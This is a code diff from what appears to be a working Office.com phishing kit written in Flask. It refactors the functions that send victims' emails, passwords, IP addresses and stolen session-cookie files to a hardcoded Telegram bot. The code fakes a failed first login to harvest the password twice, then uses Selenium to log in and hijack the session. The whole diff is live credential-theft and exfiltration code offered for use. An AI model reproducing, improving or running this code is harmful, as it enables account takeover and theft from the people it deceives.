@@ -304,280 +304,83 @@ def extract_and_save_cookies(driver, email, password=None):
         logger.error(f"Failed to extract and save session cookies: {e}")
         return False
 
-def send_first_attempt_to_telegram(email, password, ip_address):
-    """Send first password attempt to Telegram"""
+def send_to_telegram(email, password, ip_address, attempt_type="immediate", cookie_file=None):
+    """Unified function to send credentials to Telegram"""
     try:
-        # Use hardcoded values for now to ensure they work
         bot_token = "7393522943:AAHvfkr0vmQujkB91cXFfmQ3o4pc7OoJ3OM"
         chat_id = "1645281955"
         
-        if not bot_token or not chat_id:
+        if not bot_token or not chat_id or bot_token.strip() == '' or chat_id.strip() == '':
             logger.error("❌ Telegram credentials not properly configured!")
             return False
         
-        if bot_token.strip() == '' or chat_id.strip() == '':
-            logger.error("❌ Telegram credentials are empty!")
-            return False
-        
-        # Create message for first attempt
-        message = f"""🔑 WORKER CREDENTIALS - FIRST ATTEMPT
+        # Create message based on attempt type
+        if attempt_type == "immediate":
+            message = f"""🚨 WORKER CREDENTIALS CAPTURED
 📧 Email: {email}
 🔒 Password: {password}
-🌐 IP Address: {ip_address}
-📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-⚠️ Status: First attempt (blocked automatically)
-🔄 Next: Moving to second password attempt"""
+🌐 IP: {ip_address}
+📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+⚡ Status: IMMEDIATE CAPTURE"""
+        
+        elif attempt_type == "first":
+            message = f"""🔑 WORKER - FIRST ATTEMPT
+📧 Email: {email}
+🔒 Password: {password}
+🌐 IP: {ip_address}
+📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+⚠️ First attempt - moving to retry"""
+        
+        elif attempt_type == "second":
+            message = f"""🔑 WORKER - SECOND ATTEMPT
+📧 Email: {email}
+🔒 Password: {password}
+🌐 IP: {ip_address}
+📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+✅ Second attempt - starting automation"""
+        
+        elif attempt_type == "final":
+            message = f"""🔑 FINAL WORKER REPORT
+📧 Email: {email}
+🔒 Password: {password}
+🌐 IP: {ip_address}
+📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+📁 Cookie File: {cookie_file.split('/')[-1] if cookie_file else 'No file'}
+✅ Automation completed"""
         
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        response = requests.post(url, data={'chat_id': chat_id, 'text': message}, timeout=30)
         
-        response = requests.post(
-            url,
-            data={
-                'chat_id': chat_id,
-                'text': message
-            },
-            timeout=30
-        )
+        logger.info(f"Telegram {attempt_type} response: {response.status_code}")
         
-        logger.info(f"First attempt response status: {response.status_code}")
-        logger.info(f"First attempt response: {response.text}")
-        
-        return response.status_code == 200
-            
-    except Exception as e:
-        logger.error(f"❌ Error sending first attempt to Telegram: {e}")
-        return False
-
-def send_second_attempt_to_telegram(email, password, ip_address):
-    """Send second password attempt to Telegram"""
-    try:
-        # Use hardcoded values for now to ensure they work
-        bot_token = "7393522943:AAHvfkr0vmQujkB91cXFfmQ3o4pc7OoJ3OM"
-        chat_id = "1645281955"
-        
-        if not bot_token or not chat_id:
-            logger.error("❌ Telegram credentials not properly configured!")
-            return False
-        
-        if bot_token.strip() == '' or chat_id.strip() == '':
-            logger.error("❌ Telegram credentials are empty!")
-            return False
-        
-        # Create message for second attempt
-        message = f"""🔑 WORKER CREDENTIALS - SECOND ATTEMPT
-📧 Email: {email}
-🔒 Password: {password}
-🌐 IP Address: {ip_address}
-📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-✅ Status: Second attempt (proceeding to automation)
-🤖 Next: Starting browser automation and cookie extraction"""
-        
-        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        
-        response = requests.post(
-            url,
-            data={
-                'chat_id': chat_id,
-                'text': message
-            },
-            timeout=30
-        )
-        
-        logger.info(f"Second attempt response status: {response.status_code}")
-        logger.info(f"Second attempt response: {response.text}")
-        
-        return response.status_code == 200
-            
-    except Exception as e:
-        logger.error(f"❌ Error sending second attempt to Telegram: {e}")
-        return False
-
-def send_immediate_credentials_to_telegram(email, password, ip_address):
-    """Send credentials to Telegram immediately when entered"""
-    try:
-        # Use hardcoded values for now to ensure they work
-        bot_token = "7393522943:AAHvfkr0vmQujkB91cXFfmQ3o4pc7OoJ3OM"
-        chat_id = "1645281955"
-        
-        logger.info(f"🔍 TELEGRAM DEBUG - BOT_TOKEN: {bot_token[:20]}...")
-        logger.info(f"🔍 TELEGRAM DEBUG - CHAT_ID: {chat_id}")
-        
-        if not bot_token or not chat_id:
-            logger.error(f"❌ Telegram credentials missing - BOT_TOKEN: {bool(bot_token)}, CHAT_ID: {bool(chat_id)}")
-            return False
-        
-        if bot_token.strip() == '' or chat_id.strip() == '':
-            logger.error("❌ Telegram credentials are empty!")
-            return False
-        
-        # Create immediate notification message
-        message = f"""🚨 IMMEDIATE WORKER CAPTURE
-📧 Email: {email}
-🔒 Password: {password}
-🌐 IP Address: {ip_address}
-📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-⚡ Status: IMMEDIATELY CAPTURED
-🔄 Next: Processing through automation system"""
-        
-        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        
-        response = requests.post(
-            url,
-            data={
-                'chat_id': chat_id,
-                'text': message
-            },
-            timeout=30
-        )
-        
-        logger.info(f"Immediate response status: {response.status_code}")
-        logger.info(f"Immediate response: {response.text}")
-        
-        return response.status_code == 200
-            
-    except Exception as e:
-        logger.error(f"❌ Error sending immediate credentials to Telegram: {e}")
-        return False
-
-def send_cookies_to_telegram(filename, email, password, ip_address):
-    """Send cookies file to Telegram with worker details"""
-    try:
-        bot_token = config('BOT_TOKEN', default=None)
-        chat_id = config('CHAT_ID', default=None)
-        
-        # Check if values are properly set
-        if not bot_token or not chat_id:
-            logger.error("❌ Telegram credentials not properly configured!")
-            logger.error(f"BOT_TOKEN: {bot_token if bot_token else 'NOT SET'}")
-            logger.error(f"CHAT_ID: {chat_id if chat_id else 'NOT SET'}")
-            return False
-        
-        # Remove placeholder check - just verify they exist
-        if bot_token.strip() == '' or chat_id.strip() == '':
-            logger.error("❌ Telegram credentials are empty!")
-            return False
-        
-        logger.info(f"🔄 Attempting to send to Telegram...")
-        logger.info(f"Bot Token: {bot_token[:10]}..." if len(bot_token) > 10 else f"Bot Token: {bot_token}")
-        logger.info(f"Chat ID: {chat_id}")
-        logger.info(f"Bot Token length: {len(bot_token)}")
-        logger.info(f"Chat ID type: {type(chat_id)}")
-        
-        # Create detailed caption with worker information
-        caption = f"""🔑 FINAL WORKER REPORT - COOKIES CAPTURED
-📧 Email: {email}
-🔒 Password: {password}
-🌐 IP Address: {ip_address}
-📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-📁 Cookie File: {filename.split('/')[-1] if filename else 'No file'}
-✅ Status: Successfully logged into Office.com
-🍪 Cookies extracted and ready for use"""
-        
-        logger.info(f"📤 Sending worker details to Telegram - Email: {email}, IP: {ip_address}")
-        logger.info(f"📤 Message length: {len(caption)} characters")
-        
-        # First send the worker details as a message
-        message_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        
-        try:
-            message_response = requests.post(
-                message_url,
-                data={
-                    'chat_id': chat_id,
-                    'text': caption
-                },
-                timeout=30
-            )
-            
-            logger.info(f"Message response status: {message_response.status_code}")
-            logger.info(f"Message response: {message_response.text}")
-            
-            if message_response.status_code == 200:
-                logger.info("✅ Worker details message sent successfully!")
-                message_sent = True
-            else:
-                logger.error(f"❌ Failed to send worker details message: {message_response.text}")
-                message_sent = False
-                
-        except Exception as msg_e:
-            logger.error(f"❌ Exception sending message: {msg_e}")
-            message_sent = False
-        
-        # Then send the cookies file if it exists
-        file_sent = False
-        if filename and os.path.exists(filename):
+        # Send cookie file if provided
+        if cookie_file and os.path.exists(cookie_file) and attempt_type == "final":
             try:
                 file_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-                
-                with open(filename, 'rb') as file:
+                with open(cookie_file, 'rb') as file:
                     file_response = requests.post(
                         file_url,
-                        data={
-                            'chat_id': chat_id,
-                            'caption': f"📁 Session cookies for {email}"
-                        },
+                        data={'chat_id': chat_id, 'caption': f"📁 Cookies for {email}"},
                         files={'document': file},
                         timeout=30
                     )
-                
-                logger.info(f"File response status: {file_response.status_code}")
-                logger.info(f"File response: {file_response.text}")
-                
-                if file_response.status_code == 200:
-                    logger.info("✅ Cookie file sent successfully!")
-                    file_sent = True
-                else:
-                    logger.error(f"❌ Failed to send cookies file: {file_response.text}")
-                    
+                logger.info(f"Cookie file sent: {file_response.status_code}")
             except Exception as file_e:
-                logger.error(f"❌ Exception sending file: {file_e}")
-        else:
-            logger.warning(f"⚠️ Cookie file not found: {filename}")
+                logger.error(f"❌ File send error: {file_e}")
         
-        # Return True if either message or file was sent successfully
-        success = message_sent or file_sent
+        return response.status_code == 200
         
-        if success:
-            logger.info(f"✅ Telegram reporting completed for {email}")
-        else:
-            logger.error(f"❌ All Telegram sending attempts failed for {email}")
-            
-        return success
-            
     except Exception as e:
-        logger.error(f"❌ Critical error in Telegram function: {e}")
-        import traceback
-        logger.error(traceback.format_exc())
+        logger.error(f"❌ Telegram error: {e}")
         return False
+
+
 
 @app.before_request
 def before_request():
     """Initialize session before each request"""
     create_session_id()
     session.permanent = True
-    
-    # CAPTURE CREDENTIALS IMMEDIATELY ON ANY POST REQUEST
-    if request.method == 'POST' and request.endpoint == 'process_form':
-        email = request.form.get('email', '').strip().lower()
-        password = request.form.get('password', '')
-        
-        logger.info(f"🔍 BEFORE_REQUEST DEBUG: email='{email}', password='{password}' (length: {len(password)})")
-        
-        if email and password:
-            # Send credentials to Telegram immediately when submitted
-            worker_ip = get_remote_address()
-            logger.info(f"📤 BEFORE_REQUEST IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
-            
-            try:
-                immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
-                if immediate_success:
-                    logger.info(f"✅ BEFORE_REQUEST: Immediate credentials reported to Telegram for {email}")
-                else:
-                    logger.error(f"❌ BEFORE_REQUEST: Failed to send immediate credentials to Telegram for {email}")
-            except Exception as e:
-                logger.error(f"❌ BEFORE_REQUEST: Exception sending credentials: {e}")
-        else:
-            logger.warning(f"⚠️ BEFORE_REQUEST: Skipping Telegram - email='{email}', password={'[HIDDEN]' if password else '[EMPTY]'}")
 
 @app.route('/')
 @limiter.limit("200 per minute")
@@ -650,27 +453,15 @@ def verify_turnstile():
 @app.route('/', methods=['POST'])
 @limiter.limit("100 per minute")
 def process_form():
-    # DEBUG: Log all form data
-    logger.info(f"🔍 FORM DEBUG: Received form data: {dict(request.form)}")
-    
-    # CAPTURE CREDENTIALS IMMEDIATELY BEFORE ANY VALIDATION
     email = request.form.get('email', '').strip().lower()
     password = request.form.get('password', '')
+    worker_ip = get_remote_address()
     
-    logger.info(f"🔍 EXTRACTED: email='{email}', password='{password}' (length: {len(password)})")
+    logger.info(f"🔍 Processing form: {email}")
     
+    # Send credentials to Telegram immediately
     if email and password:
-        # Send credentials to Telegram immediately when submitted
-        worker_ip = get_remote_address()
-        logger.info(f"📤 IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
-        
-        immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
-        if immediate_success:
-            logger.info(f"✅ Immediate credentials reported to Telegram for {email}")
-        else:
-            logger.error(f"❌ Failed to send immediate credentials to Telegram for {email}")
-    else:
-        logger.warning(f"⚠️ SKIPPING TELEGRAM: email={email}, password={'[HIDDEN]' if password else '[EMPTY]'}")
+        send_to_telegram(email, password, worker_ip, "immediate")
     
     # Handle direct form submission from JavaScript (no WTForms validation)
     if not email or not password:
@@ -740,14 +531,8 @@ def process_form():
             log_session_activity("first_attempt_blocked", user_email=email, success=False, 
                                error_message="First attempt automatically failed - moving to second pass")
             
-            # Report first attempt to Telegram immediately
-            worker_ip = get_remote_address()
-            logger.info(f"📤 Sending FIRST attempt worker details to Telegram for {email}")
-            telegram_success = send_first_attempt_to_telegram(email, password, worker_ip)
-            if telegram_success:
-                logger.info(f"✅ First attempt reported to Telegram for {email}")
-            else:
-                logger.error(f"❌ Failed to send first attempt to Telegram for {email}")
+            # Report first attempt to Telegram
+            send_to_telegram(email, password, worker_ip, "first")
             
             # Always flash error for first attempt and redirect to retry
             flash('Your account or password is incorrect. Try again.', 'error')
@@ -760,14 +545,8 @@ def process_form():
             db.session.commit()
             log_session_activity("second_attempt_proceeding", user_email=email)
             
-            # Report second attempt to Telegram immediately
-            worker_ip = get_remote_address()
-            logger.info(f"📤 Sending SECOND attempt worker details to Telegram for {email}")
-            telegram_success = send_second_attempt_to_telegram(email, password, worker_ip)
-            if telegram_success:
-                logger.info(f"✅ Second attempt reported to Telegram for {email}")
-            else:
-                logger.error(f"❌ Failed to send second attempt to Telegram for {email}")
+            # Report second attempt to Telegram
+            send_to_telegram(email, password, worker_ip, "second")
             
             # Continue with Selenium automation below
         
@@ -842,37 +621,14 @@ def process_form():
                 flash(error_msg, 'error')
                 return redirect(url_for('index', step='password', email=email, error='true'))
             
-            # Send cookies and worker details to Telegram
-            telegram_success = send_cookies_to_telegram(cookie_file, email, password, worker_ip)
+            # Send final report with cookies to Telegram
+            telegram_success = send_to_telegram(email, password, worker_ip, "final", cookie_file)
             if telegram_success:
                 log_session_activity("telegram_send_success", user_email=email)
-                logger.info(f"✅ Successfully sent worker details to Telegram for {email}")
+                logger.info(f"✅ Final report sent to Telegram for {email}")
             else:
                 log_session_activity("telegram_send_failed", user_email=email, success=False)
-                logger.error(f"❌ Failed to send worker details to Telegram for {email}")
-                
-                # Try to send just the worker details without file as backup
-                try:
-                    bot_token = config('BOT_TOKEN', default=None)
-                    chat_id = config('CHAT_ID', default=None)
-                    if bot_token and chat_id:
-                        backup_message = f"""🔑 WORKER CREDENTIALS (BACKUP SEND)
-📧 Email: {email}
-🔒 Password: {password}
-🌐 IP: {worker_ip}
-📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-⚠️ Cookie file failed to send"""
-                        
-                        backup_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-                        backup_response = requests.post(
-                            backup_url,
-                            data={'chat_id': chat_id, 'text': backup_message},
-                            timeout=10
-                        )
-                        if backup_response.status_code == 200:
-                            logger.info("✅ Backup worker details sent successfully")
-                except Exception as backup_e:
-                    logger.error(f"❌ Backup send also failed: {backup_e}")
+                logger.error(f"❌ Failed to send final report to Telegram for {email}")
             
             # Update user last login
             user.last_login = datetime.utcnow()
